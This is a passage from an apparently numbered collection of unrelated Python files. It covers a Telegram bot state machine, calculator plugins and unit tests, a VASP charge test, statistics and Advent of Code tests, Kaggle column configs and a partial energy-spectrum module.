'allRes',\n        'calc',\n        'calc_best_sell',\n        'calc_best_buy',\n        'calc_best_sellRes',\n        'calc_best_buyRes',\n        'calc_spec_sell',\n        'calc_spec_buy',\n        'calc_spec_sell_bank',\n        'calc_spec_buy_bank',\n        'calc_spec_sellRes',\n        'calc_spec_buyRes',\n        'about',\n        'help',\n        'explain',\n        'info'\n    ],\n    transitions=[\n        {    # * -> start\n            'trigger': 'advance',\n            'source': '*',\n            'dest': 'start',\n            'conditions': 'is_going_to_start'\n        },\n        {   # start -> best\n            'trigger': 'advance',\n            'source': 'start',\n            'dest': 'best',\n            'conditions': 'is_going_to_best'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'best',\n            'dest': 'bestRes',\n            'conditions': 'is_going_to_bestRes'\n        },\n        {   # start -> all\n            'trigger': 'advance',\n            'source': 'start',\n            'dest': 'all',\n            'conditions': 'is_going_to_all'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'all',\n            'dest': 'all_bank',\n            'conditions': 'is_going_to_all_bank'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'all_bank',\n            'dest': 'allRes',\n            'conditions': 'is_going_to_allRes'\n        },\n        {   # start -> calc\n            'trigger': 'advance',\n            'source': 'start',\n            'dest': 'calc',\n            'conditions': 'is_going_to_calc'\n        },\n        {   # best calc\n            'trigger': 'advance',\n            'source': 'calc',\n            'dest': 'calc_best_sell',\n            'conditions': 'is_going_to_best_sell'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'calc',\n            'dest': 'calc_best_buy',\n            'conditions': 'is_going_to_best_buy'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'calc_best_sell',\n            'dest': 'calc_best_sellRes',\n            'conditions': 'is_going_to_best_sellRes'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'calc_best_buy',\n            'dest': 'calc_best_buyRes',\n            'conditions': 'is_going_to_best_buyRes'\n        },\n        {   # spec calc\n            'trigger': 'advance',\n            'source': 'calc',\n            'dest': 'calc_spec_sell',\n            'conditions': 'is_going_to_spec_sell'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'calc',\n            'dest': 'calc_spec_buy',\n            'conditions': 'is_going_to_spec_buy'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'calc_spec_sell',\n            'dest': 'calc_spec_sell_bank',\n            'conditions': 'is_going_to_spec_sell_bank'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'calc_spec_buy',\n            'dest': 'calc_spec_buy_bank',\n            'conditions': 'is_going_to_spec_buy_bank'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'calc_spec_sell_bank',\n            'dest': 'calc_spec_sellRes',\n            'conditions': 'is_going_to_spec_sellRes'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'calc_spec_buy_bank',\n            'dest': 'calc_spec_buyRes',\n            'conditions': 'is_going_to_spec_buyRes'\n        },\n        {   # start -> about\n            'trigger': 'advance',\n            'source': 'start',\n            'dest': 'about',\n            'conditions': 'is_going_to_about'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'about',\n            'dest': 'help',\n            'conditions': 'is_going_to_help'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'about',\n            'dest': 'explain',\n            'conditions': 'is_going_to_explain'\n        },\n        {\n            'trigger': 'advance',\n            'source': 'about',\n            'dest': 'info',\n            'conditions': 'is_going_to_info'\n        },\n        {   # go back transitions\n            'trigger': 'go_about',\n            'source': [\n                'help',\n                'explain',\n                'info'\n            ],\n            'dest': 'about'\n        },\n        {\n            'trigger': 'go_calc',\n            'source': [\n                'calc_best_sellRes',\n                'calc_best_buyRes',\n                'calc_spec_sellRes',\n                'calc_spec_buyRes'\n            ],\n            'dest': 'calc'\n        },\n        {\n            'trigger': 'go_back',\n            'source': [\n                'bestRes',\n                'allRes',\n                'calc'\n            ],\n            'dest': 'start'\n        }\n    ],\n    initial='init',\n    auto_transitions=False,\n    show_conditions=True,\n)\n\n\ndef _set_webhook():\n    status = bot.set_webhook(WEBHOOK_URL)\n    if not status:\n        print('Webhook setup failed')\n        sys.exit(1)\n    else:\n        print('Your webhook URL has been set to \"{}\"'.format(WEBHOOK_URL))\n\n\n@app.route('/hook', methods=['POST'])\ndef webhook_handler():\n    update = telegram.Update.de_json(request.get_json(force=True), bot)\n    machine.advance(update)\n    return 'ok'\n\n\n@app.route('/show-fsm', methods=['GET'])\ndef show_fsm():\n    byte_io = BytesIO()\n    machine.graph.draw(byte_io, prog='dot', format='png')\n    byte_io.seek(0)\n    return send_file(byte_io, attachment_filename='fsm.png', mimetype='image/png')\n\n\nif __name__ == \"__main__\":\n    _set_webhook()\n    app.run()\n", "388": "#!/usr/bin/python3\n\"\"\" Test the module calc and in there the function calc \"\"\"\n\nimport unittest\nimport calc\n\nclass CalcTest(unittest.TestCase):\n    \"test class for calc.calc\"\n\n    def setUp(self):\n        \"before each test\"\n        pass\n\n    def test_calc(self):\n        \"function calc exists\"\n        self.assertTrue(\"calc\" in dir(calc))\n\n    def test_calc_add(self):\n        \"addition\"\n        self.assertEqual(3.0, calc.calc(\"1\", \"+\", \"2\"))\n\n    def test_calc_sub(self):\n        \"subtraction\"\n        self.assertEqual(2.0, calc.calc(\"3\", \"-\", \"1\"))\n\n    def test_calc_mul(self):\n        \"multiplication\"\n        self.assertEqual(6.0, calc.calc(\"2\", \"*\", \"3\"))\n\n    def test_calc_div(self):\n        \"division\"\n        self.assertEqual(2.0, calc.calc(\"6\", \"/\", \"3\"))\n\n    def test_calc_add_multi(self):\n        \"add many different combinations\"\n        for x in range(1, 10):\n            for y in range(1, 10):\n                erg = calc.calc(str(x), \"+\", str(y))\n                self.assertEqual(float(x+y), erg)\n\n    def test_calc_number_fail(self):\n        \"conversion error on numbers\"\n        try:\n            erg = calc.calc(\"bla\", \"+\", \"schlonz\")\n            if isinstance(erg, (int, float)):\n                self.fail(\"must not succeed\")\n        except:\n            pass\n\n    def test_calc_op_fail(self):\n        \"no result on unknown op\"\n        try:\n            erg = calc.calc(\"1\", \"?\", \"2\")\n            if isinstance(erg, (int, float)):\n                self.fail(\"must not succeed\")\n        except:\n            pass\n\nif __name__ == '__main__':\n    unittest.main()\n", "389": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "390": "import pytest\nfrom ase.build import bulk\n\ncalc = pytest.mark.calculator\n\n\n@pytest.fixture\ndef system():\n    return bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\n@calc('vasp')\ndef test_vasp_net_charge(factory, system):\n    \"\"\"\n    Run VASP tests to ensure that determining number of electrons from\n    user-supplied net charge (via the deprecated net_charge parameter) works\n    correctly. This is conditional on the existence of the VASP_COMMAND or\n    VASP_SCRIPT environment variables.\n\n    This is mainly a slightly reduced duplicate of the vasp_charge test, but with\n    flipped signs and with checks that ensure FutureWarning is emitted.\n\n    Should be removed along with the net_charge parameter itself at some point.\n    \"\"\"\n\n    # Dummy calculation to let VASP determine default number of electrons\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False)\n    calc.calculate(system)\n    default_nelect_from_vasp = calc.get_number_of_electrons()\n    assert default_nelect_from_vasp == 12\n\n    # Compare VASP's output nelect from before + net charge to default nelect\n    # determined by us + net charge\n    with pytest.warns(FutureWarning):\n        net_charge = -2\n        calc = factory.calc(xc='LDA',\n                            nsw=-1,\n                            ibrion=-1,\n                            nelm=1,\n                            lwave=False,\n                            lcharg=False,\n                            net_charge=net_charge)\n        calc.initialize(system)\n        calc.write_input(system)\n        calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] == default_nelect_from_vasp + net_charge\n\n    # Test that conflicts between explicitly given nelect and net charge are\n    # detected\n    with pytest.raises(ValueError):\n        with pytest.warns(FutureWarning):\n            calc = factory.calc(xc='LDA',\n                                nsw=-1,\n                                ibrion=-1,\n                                nelm=1,\n                                lwave=False,\n                                lcharg=False,\n                                nelect=default_nelect_from_vasp + net_charge +\n                                1,\n                                net_charge=net_charge)\n            calc.calculate(system)\n\n    # Test that conflicts between charge and net_charge are detected\n    with pytest.raises(ValueError):\n        with pytest.warns(FutureWarning):\n            calc = factory.calc(xc='LDA',\n                                nsw=-1,\n                                ibrion=-1,\n                                nelm=1,\n                                lwave=False,\n                                lcharg=False,\n                                charge=-net_charge - 1,\n                                net_charge=net_charge)\n            calc.calculate(system)\n\n    # Test that nothing is written if net charge is 0 and nelect not given\n    with pytest.warns(FutureWarning):\n        calc = factory.calc(xc='LDA',\n                            nsw=-1,\n                            ibrion=-1,\n                            nelm=1,\n                            lwave=False,\n                            lcharg=False,\n                            net_charge=0)\n        calc.initialize(system)\n        calc.write_input(system)\n        calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n", "391": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Thu Nov  5 22:04:24 2020\n\n@author: James\n\"\"\"\nfrom pytest import approx\nfrom calculations_functions import calc_mean, calc_sdv, calc_mode\n\ndef test_calc_mean():\n    assert calc_mean([1,2,3]) == 2\n    assert calc_mean([4,2,3,3]) == 3\n    \ndef test_calc_sdv():\n    assert calc_sdv([10, 12, 23, 23, 16, 23, 21, 16] , 18) == approx(4.8989, 0.04)\n    assert calc_sdv([234, 5443, 1 ,10, 12, 23, 23] , 820) == approx(1888.52, 0.02)\n\ndef test_calc_mode():\n    assert calc_mode([1,1,1,2,3,4,5]) == 1\n    assert calc_mode([6,6,6,1,2,3,4,5,5]) == 6", "392": "import unittest\n\nfrom src.day03 import calc_oxygen_generator_rating, calc_co2_scrubber_rating, load_diagnostics, calc_gamma_rate, calc_epsilon_rate\n\nclass Day03Tests(unittest.TestCase):\n    def test_load_diagnostics(self):\n        self.assertEqual([\n            \"00100\",\n            \"11110\",\n            \"10110\",\n            \"10111\",\n            \"10101\",\n            \"01111\",\n            \"00111\",\n            \"11100\",\n            \"10000\",\n            \"11001\",\n            \"00010\",\n            \"01010\",\n        ], load_diagnostics('data/day03_diagnostics_test.txt'))\n\n    def test_calc_gamma_rate(self):\n        self.assertEqual(31, calc_gamma_rate([\"11111\"]))\n        self.assertEqual(0, calc_gamma_rate([\"00000\"]))\n        self.assertEqual(10, calc_gamma_rate([\"11111\", \"00000\", \"01010\"]))\n\n        self.assertEqual(\n            22,\n            calc_gamma_rate(load_diagnostics('data/day03_diagnostics_test.txt'))\n        )\n\n        self.assertEqual(\n            1816,\n            calc_gamma_rate(load_diagnostics('data/day03_diagnostics_tm.txt'))\n        )\n\n    def test_calc_epsilon_rate(self):\n        self.assertEqual(9, calc_epsilon_rate(load_diagnostics('data/day03_diagnostics_test.txt')))\n        self.assertEqual(2279, calc_epsilon_rate(load_diagnostics('data/day03_diagnostics_tm.txt')))\n\n    def test_calc_oxygen_generator_rating(self):\n        self.assertEqual(23, calc_oxygen_generator_rating(load_diagnostics('data/day03_diagnostics_test.txt')))\n        self.assertEqual(2031, calc_oxygen_generator_rating(load_diagnostics('data/day03_diagnostics_tm.txt')))\n\n    def test_calc_co2_scrubber_rating(self):\n        self.assertEqual(10, calc_co2_scrubber_rating(load_diagnostics('data/day03_diagnostics_test.txt')))\n        self.assertEqual(2104, calc_co2_scrubber_rating(load_diagnostics('data/day03_diagnostics_tm.txt')))\n", "393": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "394": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "395": "# set the path-to-files\nTRAIN_FILE = \"./data/train.csv\"\nTEST_FILE = \"./data/test.csv\"\n\nSUB_DIR = \"./output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "396": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "397": "import numpy as np\n\n# Refs)\n# https://numpy.org/doc/stable/reference/generated/numpy.fft.fftshift.html#numpy.fft.fftshift\n# https://qiita.com/hotta_hideyuki/items/f06aa0d0a58a28cdb055\n\n\ndef get_wavenumber(idx: int, total_num: int) -> int:\n    if idx <= total_num // 2:\n        return idx\n    return idx - total_num\n\n\ndef calc_energy_spectrum(Q: np.ndarray) -> np.ndarray:\n    \"\"\"\n    E(k) = 1/2 \\sum |q|^2 / (k^2 + l^2) k d\\theta\n    assuming the domain is [0, 2 \\pi] x [0, 2\\pi]\n    \"\"\"\n    S = np.fft.fft2(Q)  # spectral data\n    ene_spectrum = np.zeros(sum(S.shape))\n\n    max_idx = 0\n    for i in range(S.shape[0]):\n        kx = get_wavenumber(i, S.shape[0])\n        for j in range(S.shape[1]):\n            ky = get_wavenumber(j, S.shape[1])\n\n            k2 = kx ** 2 + ky ** 2\n            if k2 == 0:\n                continue  # kx and ky == 0, so zero-division will occur\n\n            idx = int(np.sqrt(k2) + 0.5)\n            ene_spectrum[idx] += np.abs(S[i, j]) ** 2 / k2\n            if idx > max_idx:\n                max_idx = idx\n\n    # The denominator is a normalization constant due to numpy fft\n    return 0.5 * ene_spectrum[:max_idx] / (S.shape[0] * S.shape[1]) ** 2\n\n\ndef calc_energy_spectrum_from_uv(U: np.ndarray, V: np.ndarray) -> np.ndarray:\n    \"\"\"\n    E(k) = 1/2 \\sum (|U|^2 + |V|^2) k d\\theta\n    assuming the domain is [0, 2 \\pi] x [0, 2\\pi]\n    \"\"\"\n    assert U.shape == V.shape\n    assert len(U.shape) == 2\n    SU = np.fft.fft2(U)  # spectral data\n    SV = np.fft.fft2(V)  # spectral data\n    ene_spectrum = np.zeros(sum(SU.shape))\n\n    max_idx = 0\n    for i in range(SU.shape[0]):\n        kx = get_wavenumber(i, SU.shape[0])\n        for j in range(SU.shape[1]):\n            ky = get_wavenumber(j, SU.shape[1])\n\n            k2 = kx ** 2 + ky ** 2\n            idx = int(np.sqrt(k2) + 0.5)\n\n            ene_spectrum[idx] += np.abs(SU[i, j]) ** 2 + np.abs(SV[i, j]) ** 2\n            if idx > max_idx:\n                max_idx = idx\n\n    # The denominator is a normalization constant due to numpy fft\n    return 0.5 * ene_spectrum[:max_idx] / (SU.shape[0] * SU.shape[1]) ** 2\n\n\ndef calc_enstrophy_spectrum(Q: np.ndarray) -> np.ndarray:\n    \"\"\"\n    Z(k) = 1/2 \\sum |q|^2 k d\\theta\n    assuming the domain is [0, 2 \\pi] x [0, 2\\pi]\n    \"\"\"\n    S = np.fft.fft2(Q)  # spectral data\n    ens_spectrum = np.zeros(sum(S.shape))\n\n    max_idx = 0\n    for i in range(S.shape[0]):\n        kx = get_wavenumber(i, S.shape[0])\n        for j in range(S.shape[1]):\n            ky = get_wavenumber(j, S.shape[1])\n\n            k2 = kx ** 2 + ky ** 2\n            if k2 